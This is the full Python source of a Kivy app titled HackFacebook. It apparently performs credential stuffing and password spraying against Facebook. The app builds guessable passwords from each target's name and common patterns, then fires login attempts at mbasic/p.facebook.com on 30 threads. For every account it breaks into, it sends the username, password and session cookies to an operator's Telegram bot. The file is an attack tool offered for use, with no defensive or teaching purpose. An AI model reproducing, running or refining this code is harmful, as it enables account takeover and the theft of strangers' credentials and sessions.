#Facebook Post need Just this
import re
import requests
from concurrent.futures import ThreadPoolExecutor as tred
########
#MY APP
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.filechooser import FileChooserIconView
####




class HackFacebook(App):
    def build(self):
        self.file_data = None

        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)

        self.title_label = Label(text='Facebook', font_size='24sp', bold=True)
        self.layout.add_widget(self.title_label)

        self.token_input = TextInput(hint_text='Token')
        self.layout.add_widget(self.token_input)

        self.chat_id_input = TextInput(hint_text='ID')
        self.layout.add_widget(self.chat_id_input)

        self.file_chooser = FileChooserIconView()
        self.layout.add_widget(self.file_chooser)

        self.select_file_button = Button(text='Select File', on_press=self.select_file)
        self.layout.add_widget(self.select_file_button)

        self.start_button = Button(text='Start', on_press=self.start_processing)
        self.layout.add_widget(self.start_button)

        self.ok_label = Label(text='OK: 0', color=(0, 1, 0, 1))
        self.layout.add_widget(self.ok_label)

        self.cp_label = Label(text='CP: 0', color=(1, 0.5, 0, 1))
        self.layout.add_widget(self.cp_label)

        self.bad_label = Label(text='Bad: 0', color=(1, 0, 0, 1))
        self.layout.add_widget(self.bad_label)

        self.status_label = Label(text='')
        self.layout.add_widget(self.status_label)

        return self.layout

    def select_file(self, instance):
        if self.file_chooser.selection:
            file_path = self.file_chooser.selection[0]
            with open(file_path, 'r') as file:
                self.file_data = file.readlines()
            self.status_label.text = 'File loaded successfully'
        else:
            self.status_label.text = 'No file selected'

    def start_processing(self, instance):
        if self.file_data:
            self.status_label.text = 'Processing started...'
            self.process_file(self.file_data)
        else:
            self.status_label.text = 'No file selected'

    def process_file(self, file_data):
        self.ok = 0
        self.cp = 0
        self.bad = 0
        with tred(max_workers=30) as pool:
            for ssl in file_data:
                user = ssl.split('|')[0].strip()
                nmf = ssl.split('|')[1].strip().lower()
                frs = nmf.split(' ')[0].strip()
                pwv = []

                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + frs)
                        pwv.append(frs + ' ' + frs)                    
                        pwv.append('1122334455@@')
                        pwv.append('Aa123456')              
                        pwv.append('mmmmnnnn')
                        pwv.append('nnnnmmmm')
                        pwv.append('mmnnbbvv')
                        pwv.append('zzzzxxxx')
                        pwv.append('zzxxccvv')
                        pwv.append('qqwweerr')
                        pwv.append('12345@12345')
                        pwv.append('123@123')
                        pwv.append('1234512345')
                        pwv.append('123412345')
                        pwv.append('1234554321')
                        pwv.append('00998877')
                        pwv.append('123456123456')
                        pwv.append('1122334455')
                        pwv.append('1q2w3e4r5t')
                        pwv.append('1q2w3e4r5t6y')
                        pwv.append('1020304050')
                        pwv.append('20222022')
                        pwv.append('aassddff')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append('19901990')
                        pwv.append('19911991')
                        pwv.append('19921992')
                        pwv.append('19931993')
                        pwv.append('19941994')
                        pwv.append('19951995')
                        pwv.append('19961996')
                        pwv.append('19971997')
                        pwv.append('19981998')
                        pwv.append('19991999')
                        pwv.append('qqwweerr')
                        pwv.append('mmnnbbvv')
                        pwv.append('aassddffgg')
                        pwv.append('aassddff')
                        pwv.append('1020304050')
                        pwv.append('10203040')
                        pwv.append('1234554321')
                        pwv.append('1234512345')
                        pwv.append('20082008')
                        pwv.append('20202020')
                        pwv.append('20212021')
                elif len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append('19901990')
                    pwv.append('734707298')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
                    pwv.append('qqwweerr')
                    pwv.append('mmnnbbvv')
                    pwv.append('aassddffgg')
                    pwv.append('aassddff')
                    pwv.append('1020304050')
                    pwv.append('10203040')
                    pwv.append('123554321')
                    pwv.append('1234512345')
                    pwv.append('20082008')
                    pwv.append('20202020')
                    pwv.append('20212021')
                    pwv.append('qqwweerrtt')
                    pwv.append('qqwweerrttyy')
                    pwv.append('zzxxccvvbbnnmm')
                    pwv.append('aassddffgghhjjkkll')

                for ps in pwv:
                    pool.submit(self.Mahos, user, ps)

    def Mahos(self, idf, ps):
        try:
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', free_fb).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', free_fb).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', free_fb).group(1),
                "li": re.search('name="li" value="(.*?)"', free_fb).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": idf,
                "pass": ps,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'p.facebook.com',
                "method": 'GET',
                "scheme": 'https',
                'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'referer': 'https://p.facebook.com/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
            }
            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data=log_data, headers=header_freefb)
            if 'c_user' in session.cookies.get_dict().keys():
                self.ok += 1
                coki = ";".join([key+"="+value for key, value in session.cookies.get_dict().items()])
                tlg = f"""
𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️\n⋘─────━━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  {coki}\n\n ❖ - https://www.facebook.com/profile.php?id={idf}\n\n⋘─────━@maho_s9━─────⋙  
"""
                requests.post(f'https://api.telegram.org/bot{self.token_input.text}/sendMessage?chat_id={self.chat_id_input.text}&text={tlg}')
            elif 'checkpoint' in lo.cookies.get_dict().keys():
                self.cp += 1
                coki = ";".join([f"{key}={value}" for key, value in session.cookies.items()])
                tlg = f"""
𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 CP\n⋘─────━━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  {coki}\n\n ❖ - https://www.facebook.com/profile.php?id={idf}\n\n⋘─────━@maho_s9━─────⋙ 
"""
                requests.post(f'https://api.telegram.org/bot{self.token_input.text}/sendMessage?chat_id={self.chat_id_input.text}&text={tlg}')
            else:
                self.bad += 1
            self.update_counters()
        except Exception as e:
            print(e)
            pass

    def update_counters(self):
        self.ok_label.text = f'OK: {self.ok}'
        self.cp_label.text = f'CP: {self.cp}'
        self.bad_label.text = f'Bad: {self.bad}'

if __name__ == '__main__':
    HackFacebook().run()